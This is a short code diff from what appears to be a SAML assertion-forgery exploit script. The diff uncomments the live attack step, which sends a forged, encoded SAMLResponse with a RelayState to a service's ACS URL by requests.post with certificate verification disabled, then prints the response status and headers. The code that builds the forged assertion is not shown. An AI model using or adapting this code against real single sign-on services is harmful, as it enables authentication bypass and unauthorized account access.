@@ -225,10 +225,10 @@ def main():
 
         print("[*] POSTing fake assertion to ACS URL")
         acs_post_url_saml = acs_post_url + "?RelayState=" + saml_relay_state + "&SAMLResponse=" + str(fake_response_enc)
-        #attack_result = requests.post(acs_post_url_saml, headers=req_headers, verify=False)
-        #print("- Attack result:")
-        #print(attack_result.status_code)
-        #print(attack_result.headers)
+        attack_result = requests.post(acs_post_url_saml, headers=req_headers, verify=False)
+        print("- Attack result:")
+        print(attack_result.status_code)
+        print(attack_result.headers)
     finally:
         print("[*] Done.")
 
